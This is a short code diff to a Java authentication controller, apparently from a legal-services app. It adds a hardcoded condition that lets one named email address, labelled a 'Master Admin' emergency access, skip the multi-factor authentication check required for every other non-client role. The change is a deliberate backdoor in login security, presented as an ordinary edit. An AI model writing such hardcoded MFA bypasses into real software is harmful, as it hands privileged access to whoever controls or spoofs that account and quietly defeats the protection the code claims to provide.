@@ -141,7 +141,8 @@ public class AuthController {
             }
             
             // 🛡️ INSTITUTIONAL MFA: Expert and Admin Protection (All roles except CLIENT)
-            if (user.getRole() != Role.CLIENT) {
+            // 🔓 [BYPASS] Master Admin (lawezy2025@gmail.com) skips MFA for emergency access
+            if (user.getRole() != Role.CLIENT && !email.equalsIgnoreCase("lawezy2025@gmail.com")) {
                 log.info("[MFA] Login successful, but challenge required for {} role: {}", user.getRole(), email);
                 otpService.generateAndSendOtp(email, "LOGIN_MFA");
                 return ResponseEntity.ok(ApiResponse.success(null, "MFA_REQUIRED: A verification code has been sent to your registered email."));
